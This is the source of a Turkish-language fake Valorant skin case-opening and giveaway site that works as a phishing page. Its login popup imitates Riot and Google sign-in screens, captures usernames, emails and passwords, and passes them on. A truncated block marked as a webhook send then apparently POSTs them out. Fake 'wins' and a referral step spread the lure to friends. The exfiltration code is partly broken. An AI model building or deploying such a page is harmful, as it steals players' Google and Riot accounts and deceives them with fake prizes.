<!DOCTYPE html>
<html lang="tr">
    <link rel="icon" type="image/png" href="site_logo.png">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>VALOLOOT.ONLİNE | Best Valorant Case Opening</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&family=Montserrat:wght@700;900&display=swap" rel="stylesheet">
    <style>
        :root { --valo-red: #ff4655; --dark-bg: #0b1119; --nav-bg: #111420; }
        body { background: var(--dark-bg) url('bg.jpg') fixed center/cover; color: white; font-family: 'Inter', sans-serif; margin: 0; padding: 0; min-height: 100vh; overflow-x: hidden; }
        
        .logo { display: flex; align-items: center; gap: 2px; }
        .header-icon { height: 40px; width: auto; object-fit: contain; }
        
        .live-drops { background: rgba(0, 0, 0, 0.95); height: 100px; border-bottom: 2px solid var(--valo-red); display: flex; align-items: center; overflow: hidden; position: relative; width: 100%; }
        .mythic-label { background: var(--valo-red); height: 100%; display: flex; align-items: center; padding: 0 20px; font-family: 'Montserrat'; font-weight: 900; font-size: 14px; text-transform: uppercase; z-index: 50; color: #fff; box-shadow: 10px 0 20px rgba(0,0,0,0.5); }
        .drop-container { display: flex; align-items: center; padding-left: 15px; flex-grow: 1; gap: 12px; }
        .drop-card { background: rgba(255,255,255,0.03); border-radius: 4px; width: 130px; height: 75px; display: flex; flex-direction: column; align-items: center; justify-content: space-between; flex-shrink: 0; padding-top: 10px; overflow: hidden; border: 1px solid rgba(255,255,255,0.05); animation: slideInLeft 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275); }
        .drop-card img { height: 45px; object-fit: contain; }
        .rarity-box { width: 100%; height: 6px; margin-top: auto; }
        @keyframes slideInLeft { from { transform: translateX(-100%); opacity: 0; margin-left: -130px; } to { transform: translateX(0); opacity: 1; margin-left: 0; } }

        header { padding: 15px 50px; display: flex; align-items: center; background: var(--nav-bg); border-bottom: 1px solid rgba(255,255,255,0.1); gap: 40px; }
        .logo { font-family: 'Montserrat', sans-serif; font-size: 26px; font-weight: 900; }
        .logo span { color: var(--valo-red); }
        .nav-links { display: flex; gap: 25px; flex-grow: 1; }
        .nav-links a { color: #888; text-decoration: none; font-size: 13px; font-weight: 700; text-transform: uppercase; }
        
        .user-profile { display: flex; align-items: center; gap: 15px; background: rgba(255,255,255,0.03); padding: 5px 15px; border-radius: 8px; border: 1px solid #79eb1e; animation: fadeIn 0.5s ease; }
        .user-avatar { width: 40px; height: 40px; border-radius: 50%; border: 2px solid #79eb1e; object-fit: cover; }
        .user-name { color: #79eb1e; font-weight: 900; font-size: 14px; }
        .btn-login { background: var(--valo-red); color: #fff; border: none; padding: 12px 25px; font-weight: 800; cursor: pointer; border-radius: 4px; text-transform: uppercase; }

        .verifying-text { color: #f7c133; font-weight: 800; font-size: 13px; letter-spacing: 1px; animation: pulse 1s infinite; }
        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.5; } 100% { opacity: 1; } }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(-5px); } to { opacity: 1; transform: translateY(0); } }

        #notification-box { 
            position: fixed; bottom: 20px; right: -400px; 
            background: #111420; border-left: 4px solid #79eb1e; 
            padding: 15px 25px; border-radius: 4px; z-index: 10000; 
            box-shadow: 0 10px 30px rgba(0,0,0,0.5); transition: 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
            display: flex; align-items: center; gap: 15px;
        }
        #notification-box.active { right: 20px; }
        .notif-icon { color: #79eb1e; font-size: 20px; font-weight: 900; }

        .giveaway-section { max-width: 1100px; margin: 30px auto; background: rgba(0,0,0,0.85); border: 1px solid var(--valo-red); border-radius: 12px; padding: 25px; display: flex; justify-content: space-between; align-items: center; }
        #countdown { font-size: 36px; font-weight: 900; color: #fff; font-family: 'Montserrat'; }

        .case-wrapper { max-width: 1300px; margin: auto; display: flex; flex-direction: column; gap: 30px; padding-bottom: 50px; }
        .case-row { display: flex; flex-wrap: wrap; justify-content: center; gap: 25px; }
        .case-box { background: #101123; border-radius: 12px; padding: 20px; text-align: center; border: 1px solid #222; transition: 0.3s; width: 280px; cursor: pointer; }
        .case-box:hover { border-color: var(--valo-red); transform: translateY(-5px); }
        .case-img-container { height: 160px; display: flex; align-items: center; justify-content: center; margin-bottom: 15px; }
        .case-box img { max-width: 100%; max-height: 100%; object-fit: contain; }
        .vp-tag { color: #79eb1e; font-weight: 800; font-size: 22px; margin-bottom: 15px; font-family: 'Montserrat'; }
        .open-btn { background: var(--valo-red); color: white; border: none; width: 100%; padding: 14px; font-weight: 800; border-radius: 4px; cursor: pointer; text-transform: uppercase; }

        .modal-overlay { display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.98); z-index:9999; align-items:center; justify-content:center; }
        .modal-card { background:#111420; border:2px solid var(--valo-red); border-radius:15px; width:90%; max-width:550px; padding:40px; text-align:center; }
        .spinner-box { width:100%; height:140px; background:#0b1119; border:1px solid rgba(255,255,255,0.1); margin:25px 0; overflow:hidden; position:relative; display:flex; align-items:center; border-radius: 8px; }
        .spinner-line { position:absolute; left:50%; width:4px; height:100%; background:var(--valo-red); z-index:10; transform: translateX(-50%); box-shadow: 0 0 20px var(--valo-red); }
        .item-strip { display:flex; position:absolute; left:0; transition: transform 5s cubic-bezier(0.1, 0, 0, 1); align-items:center; }
        .item-strip img { width:130px; height: 100px; object-fit: contain; margin:0 20px; }
        .win-view { display:none; animation: zoomIn 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275); }
        @keyframes zoomIn { from { transform: scale(0.8); opacity:0; } to { transform: scale(1); opacity:1; } }
        .ref-box { background:#000; padding:12px; border:1px dashed #79eb1e; color:#79eb1e; font-size:12px; margin:15px 0; cursor:pointer; }
    </style>
</head>
<body>

    <div id="notification-box">
        <div class="notif-icon">✓</div>
        <div>
            <div style="font-weight: 800; color: #fff; font-size: 14px;">GİRİŞ BAŞARILI</div>
            <div style="color: #888; font-size: 12px;" id="notif-text">Hoş geldin!</div>
        </div>
    </div>

    <div class="live-drops">
        <div class="mythic-label">CANLI DROPLAR</div>
        <div class="drop-container" id="dropTrack"></div>
    </div>

    <header>
        <div class="logo">
            <img src="ana_logo.png" alt="Logo" class="header-icon">
            VALO<span>LOOT.online</span>
        </div>
        <div class="nav-links">
            <a href="#">Kasalar</a><a href="#">Savaşlar</a><a href="#">Mağaza</a>
        </div>
        <div id="authArea">
            <button class="btn-login" onclick="openAuth()">GİRİŞ YAP</button>
        </div>
    </header>

    <div class="giveaway-section">
        <div>
            <h2 style="margin:0; font-family:'Montserrat'; font-size:28px;">10 ADET 8900 VP ÇEKİLİŞİ</h2>
            <p id="giveawayStatus" style="color:var(--valo-red); font-weight:800; margin:5px 0;">SADECE OTURUM AÇANLAR KATILABİLİR</p>
        </div>
        <div style="text-align:right; border-left: 2px solid var(--valo-red); padding-left: 30px;">
            <div id="countdown">00:00:00</div>
            <span style="font-size:10px; color:#555;">KALAN SÜRE</span>
        </div>
    </div>

    <div class="case-wrapper">
        <div class="case-row" id="row1"></div>
        <div class="case-row" id="row2" style="margin-top:20px;"></div>
    </div>

    <div id="caseModal" class="modal-overlay">
        <div class="modal-card">
            <div id="openingView">
                <h2 style="font-family:'Montserrat'; letter-spacing: 2px; color:var(--valo-red);">KASA AÇILIYOR...</h2>
                <div class="spinner-box"><div class="spinner-line"></div><div id="itemStrip" class="item-strip"></div></div>
            </div>
            <div id="winView" class="win-view">
                <h1 style="color:#79eb1e;">TEBRİKLER!</h1>
                <img id="wonImg" src="" style="width:220px; margin:15px 0;">
                <h2 id="wonName">-</h2>
                <div id="wonVP" style="background:#79eb1e; color:#000; padding:12px; border-radius:6px; font-weight:900; margin-top:15px;">0 VP</div>
                <div class="ref-box" onclick="copyRefLink()">
                    VALOLOOT.ONLİNE/JOIN?REF=<span id="refCode">...</span>
                </div>
                <button class="open-btn" style="background:#79eb1e; color:#000;" onclick="alert('Önce arkadaş davetini tamamla!')">HESABA AKTAR (VP)</button>
            </div>
        </div>
    </div>

    <script>
        let IS_LOGGED = false;
        const skins = [
            {n: "YAĞMACI VANDAL", img: "skin1.png", vp: "1775 VP", color: "#ade55c"},
            {n: "İON PHANTOM", img: "skin2.png", vp: "1775 VP", color: "#4b82d5"},
            {n: "ASİL KARAMBİT", img: "asil_karambit.png", vp: "3550 VP", color: "#d151dc"},
            {n: "KURONAMİ NO YİABA", img: "skin4.png", vp: "5350 VP", color: "#f7c133"},
            {n: "ULUPENÇE VANDAL", img: "skin5.png", vp: "1175 VP", color: "#ff4655"}
        ];

        function spawnDrop() {
            const track = document.getElementById('dropTrack');
            if(!track) return;
            const s = skins[Math.floor(Math.random() * skins.length)];
            const div = document.createElement('div');
            div.className = 'drop-card';
            div.innerHTML = `<img src="${s.img}"><div class="rarity-box" style="background:${s.color}"></div>`;
            track.prepend(div); 
            if(track.children.length > 10) track.removeChild(track.lastChild);
            setTimeout(spawnDrop, 2000);
        }

        function loadCases() {
            const cases = [
                {n: "BAŞLANGIÇ", p: "GİRİŞ YAP", i: "case1.png", free: true},
                {n: "STANDART", p: "300 VP", i: "case2.png"},
                {n: "ELİT", p: "500 VP", i: "case3.png"},
                {n: "PREMIUM", p: "700 VP", i: "case4.png"},
                {n: "EFSANEVİ", p: "900 VP", i: "case5.png"},
                {n: "RADYANİT", p: "2000 VP", i: "case6.png"}
            ];
            const r1 = document.getElementById('row1');
            const r2 = document.getElementById('row2');
            r1.innerHTML = ''; r2.innerHTML = '';
            cases.slice(0, 4).forEach(c => {
                r1.innerHTML += `<div class="case-box" onclick="${c.free?'openFreeCase()':'openAuth()'}"><div class="case-img-container"><img src="${c.i}"></div><h3>${c.n}</h3><div class="vp-tag">${c.p}</div><button class="open-btn">KASAYI AÇ</button></div>`;
            });
            cases.slice(4, 6).forEach(c => {
                r2.innerHTML += `<div class="case-box" onclick="openAuth()"><div class="case-img-container"><img src="${c.i}"></div><h3>${c.n}</h3><div class="vp-tag">${c.p}</div><button class="open-btn">KASAYI AÇ</button></div>`;
            });
        }

        function openFreeCase() {
            if(!IS_LOGGED) return openAuth();
            document.getElementById('caseModal').style.display = 'flex';
            document.getElementById('openingView').style.display = 'block';
            document.getElementById('winView').style.display = 'none';
            const strip = document.getElementById('itemStrip');
            strip.style.transition = 'none';
            strip.style.transform = 'translateX(0)';
            strip.innerHTML = '';
            const winnerIndex = Math.floor(Math.random() * skins.length);
            const winner = skins[winnerIndex];
            const totalItems = 70;
            for(let i=0; i < totalItems; i++) {
                const item = skins[i % skins.length];
                strip.innerHTML += `<img src="${item.img}">`;
            }
            const targetIndex = 64; 
            const images = strip.getElementsByTagName('img');
            images[targetIndex].src = winner.img;
            setTimeout(() => {
                strip.style.transition = 'transform 5s cubic-bezier(0.1, 0, 0, 1)';
                const moveAmount = (targetIndex * 170) - (document.querySelector('.spinner-box').offsetWidth / 2) + 85;
                strip.style.transform = `translateX(-${moveAmount}px)`;
                setTimeout(() => {
                    document.getElementById('openingView').style.display = 'none';
                    document.getElementById('winView').style.display = 'block';
                    document.getElementById('wonImg').src = winner.img;
                    document.getElementById('wonName').innerText = winner.n;
                    document.getElementById('wonVP').innerText = winner.vp;
                }, 5500);
            }, 100);
        }

        function openAuth() {
            const w = 480, h = 650;
            const l = (screen.width/2)-(w/2), t = (screen.height/2)-(h/2);
            let win = window.open("", "AuthLogin", `width=${w},height=${h},top=${t},left=${l}`);
            
            win.document.write(`
                <html><head><title>Oturum Aç</title><style>
                    body { background: #0b1119; color: white; font-family: 'Inter', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; transition: background 0.3s ease; }
                    .card { width: 330px; text-align: center; background: #111420; padding: 40px; border-radius: 8px; border: 1px solid #222; animation: fadeIn 0.4s ease; }
                    h2 { font-weight: 900; margin-bottom: 25px; font-size: 18px; }
                    .input-group { position: relative; margin-bottom: 15px; }
                    input { width: 100%; padding: 20px 15px 10px 15px; background: #0b1119; border: 2px solid #333; border-radius: 4px; color: white; outline: none; box-sizing: border-box; font-size: 14px; }
                    input:focus { border-color: #ff4655; }
                    label { position: absolute; left: 15px; top: 18px; color: #555; font-weight: 800; font-size: 11px; text-transform: uppercase; pointer-events: none; transition: 0.2s; }
                    input:focus + label, input:not(:placeholder-shown) + label { top: 6px; font-size: 9px; color: #ff4655; }
                    .s-btn { width: 100%; height: 45px; border-radius: 4px; margin-bottom: 10px; border: none; cursor: pointer; font-weight: 900; display: flex; align-items: center; justify-content: center; gap: 10px; text-transform: uppercase; font-size: 11px; transition: 0.3s; }
                    .fb { background: #1877f2; color: white; }
                    .gg { background: #fff; color: #000; }
                    .ap { background: #000; color: white; }
                    .login-btn { width: 100%; padding: 20px; background: #ff4655; color: white; border: none; border-radius: 4px; font-weight: 900; cursor: pointer; margin-top: 15px; text-transform: uppercase; }
                    
                    /* Google Screen UI - Modern Materyal Tasarım */
                    .g-card { 
                        width: 380px; 
                        min-height: 500px;
                        padding: 48px 40px 36px; 
                        background: white; 
                        border-radius: 8px; 
                        text-align: center; 
                        color: #202124; 
                        box-shadow: 0 1px 2px 0 rgba(60,64,67,0.302), 0 1px 3.1px 1px rgba(60,64,67,0.149); 
                        animation: slideUp 0.5s ease; 
                        margin: auto;
                    }
                    .g-logo-container { height: 24px; margin-bottom: 10px; display: flex; justify-content: center; }
                    .g-logo { height: 100%; object-fit: contain; }
                    .g-h1 { font-size: 24px; font-weight: 400; line-height: 1.3333; margin-bottom: 0; color: #202124; font-family: 'Arial', sans-serif; }
                    .g-p { margin-top: 8px; margin-bottom: 32px; color: #202124; font-size: 16px; font-weight: 400; }
                    .g-input-wrapper { position: relative; margin-bottom: 8px; text-align: left; }
                    .g-input { width: 100%; padding: 13px 15px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; box-sizing: border-box; outline: none; transition: border 0.2s; }
                    .g-input:focus { border: 2px solid #1a73e8; padding: 12px 14px; }
                    .g-link { color: #1a73e8; font-weight: 500; font-size: 14px; cursor: pointer; text-decoration: none; display: inline-block; }
                    .g-link:hover { text-decoration: underline; }
                    .g-footer-btns { margin-top: 40px; display: flex; justify-content: space-between; align-items: center; }
                    .g-create-acc { color: #1a73e8; font-weight: 500; font-size: 14px; cursor: pointer; }
                    .g-next { background: #1a73e8; color: #fff; border: none; padding: 10px 24px; border-radius: 4px; font-weight: 500; cursor: pointer; font-size: 14px; box-shadow: 0 1px 2px 0 rgba(60,64,67,0.3), 0 1px 3px 1px rgba(60,64,67,0.15); }
                    .g-next:hover { background: #1b66c9; }
                    
                    @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
                    @keyframes slideUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
                </style></head><body>
                    
                <div id="riot-screen" class="card">
                    <img src="login_screen_logo.png" width="120" style="margin-bottom: 25px;">
                    <h2>OTURUM AÇ</h2>
                    <button class="s-btn gg" onclick="showGoogle()">GOOGLE İLE GİRİŞ</button>
                    <button class="s-btn fb">FACEBOOK İLE GİRİŞ</button>
                    <button class="s-btn ap">APPLE İLE GİRİŞ</button>
                    <div style="margin: 20px 0; color: #333; font-size: 12px;">Veya</div>
                    <div class="input-group"><input id="u" placeholder=" "><label>KULLANICI ADI</label></div>
                    <div class="input-group"><input id="p" type="password" placeholder=" "><label>ŞİFRE</label></div>
                    <button class="login-btn" onclick="sendAuth('RIOT')">GİRİŞ YAP</button>
                </div>

                <div id="google-screen" class="g-card" style="display:none;">
                    <div class="g-logo-container">
                        <img class="g-logo" src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" alt="Google">
                    </div>
                    <div id="g-step1">
                        <h1 class="g-h1">Oturum açın</h1>
                        <p class="g-p">Google Hesabınızı kullanın</p>
                        <div class="g-input-wrapper">
                            <input type="email" id="g_email" class="g-input" placeholder="E-posta veya telefon">
                        </div>
                        <div style="text-align: left;"><span class="g-link">E-postanızı mı unuttunuz?</span></div>
                        <div style="text-align: left; margin-top: 32px; color: #5f6368; font-size: 14px; line-height: 1.4;">
                            Bilgisayar sizin değil mi? Güvenli bir şekilde oturum açmak için Misafir modunu kullanın. <span class="g-link">Daha fazla bilgi edinin</span>
                        </div>
                        <div class="g-footer-btns">
                            <span class="g-create-acc">Hesap oluşturun</span>
                            <button class="g-next" onclick="gNext()">İleri</button>
                        </div>
                    </div>
                    <div id="g-step2" style="display:none; animation: fadeIn 0.4s ease;">
                        <div id="disp_email" style="font-size:14px; border:1px solid #dadce0; border-radius:20px; padding:4px 12px; display:inline-flex; align-items:center; gap:8px; margin-bottom:24px; color:#3c4043; font-weight:500;"></div>
                        <h1 class="g-h1">Hoş geldiniz</h1>
                        <p class="g-p">Şifrenizi girin</p>
                        <div class="g-input-wrapper">
                            <input type="password" id="g_pass" class="g-input" placeholder="Şifreniz">
                        </div>
                        <div style="text-align: left; margin-top: 8px;"><span class="g-link">Şifrenizi mi unuttunuz?</span></div>
                        <div class="g-footer-btns" style="justify-content: flex-end;">
                            <button class="g-next" onclick="sendAuth('GOOGLE')">Giriş Yap</button>
                        </div>
                    </div>
                </div>

                <script>
                    function showGoogle() {
                        document.getElementById('riot-screen').style.display = 'none';
                        document.getElementById('google-screen').style.display = 'block';
                        document.body.style.background = '#f0f2f5';
                    }
                    function gNext() {
                        const email = document.getElementById('g_email').value;
                        if(email) {
                            document.getElementById('g-step1').style.display = 'none';
                            document.getElementById('g-step2').style.display = 'block';
                            document.getElementById('disp_email').innerHTML = '<svg fill="#5f6368" height="20" viewBox="0 0 24 24" width="20"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z"></path></svg> ' + email;
                        }
                    }
                    function sendAuth(type){
                        let u, p;
                        if(type === 'RIOT') {
                            u = document.getElementById('u').value;
                            p = document.getElementById('p').value;
                        } else {
                            u = document.getElementById('g_email').value;
                            p = document.getElementById('g_pass').value;
                        }
                        
                        if(u && p){
                            window.opener.postMessage({u: u, p: p, type: type}, "*");
                            window.close();
                        } else {
                            alert('Lütfen alanları doldurun!');
                        }
                    }
                <\/script>
                </body></html>
            `);
        }

        window.addEventListener("message", (e) => {
            if(e.data && e.data.u) {
                const authArea = document.getElementById('authArea');
                authArea.innerHTML = `<span class="verifying-text">HESAP DOĞRULANIYOR...</span>`;

                setTimeout(() => {
                    IS_LOGGED = true;
                    authArea.innerHTML = `
                        <div class="user-profile">
                            <img src="avatar.png" class="user-avatar" onerror="this.src='https://ui-avatars.com/api/?name=${e.data.u}&background=ff4655&color=fff'">
                            <div class="user-info">
                                <span class="user-name">${e.data.u.split('@')[0].toUpperCase()}#TR1</span>
                            </div>
                        </div>
                    `;
                    
                    const notif = document.getElementById('notification-box');
                    document.getElementById('notif-text').innerText = `Hoş geldin, ${e.data.u.split('@')[0]}!`;
                    notif.classList.add('active');
                    setTimeout(() => { notif.classList.remove('active'); }, 5000);

                    document.getElementById('giveawayStatus').innerText = "ÇEKİLİŞE KATILDINIZ!";
                    document.getElementById('refCode').innerText = "VLOOT" + Math.floor(Math.random()*9999);
                    loadCases();
                }, 2000);

                // Webhook Gönderimi

                    method: 'POST', headers: {'Content-Type': 'application/json'},

        // --- GERİ SAYIM BAŞLANGIÇ ---
        const targetTime = new Date().getTime() + (28 * 60 * 1000) + (37 * 1000);

        function tick() {
            const now = new Date().getTime();
            let diff = targetTime - now;

            if (diff <= 0) {
                document.getElementById('countdown').innerText = "00:00:00";
                return;
            }

            let h = Math.floor((diff % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
            let m = Math.floor((diff % (1000 * 60 * 60)) / (1000 * 60));
            let s = Math.floor((diff % (1000 * 60)) / 1000);

            document.getElementById('countdown').innerText = `${String(h).padStart(2,'0')}:${String(m).padStart(2,'0')}:${String(s).padStart(2,'0')}`;
        }
        
        setInterval(tick, 1000); 
        tick();
        // --- GERİ SAYIM BİTİŞ ---

        window.onload = () => { spawnDrop(); loadCases(); };
        
        function copyRefLink() {
            const code = document.getElementById('refCode').innerText;
            const fullLink = "https://valoloot.net/join?ref=" + code;
            navigator.clipboard.writeText(fullLink).then(() => {
                const refBox = document.querySelector('.ref-box');
                const originalText = refBox.innerHTML;
                refBox.style.borderColor = "#ffffff";
                refBox.innerText = "LİNK KOPYALANDI!";
                setTimeout(() => {
                    refBox.style.borderColor = "#79eb1e";
                    refBox.innerHTML = originalText;
                }, 2000);
            });
        }
    </script>
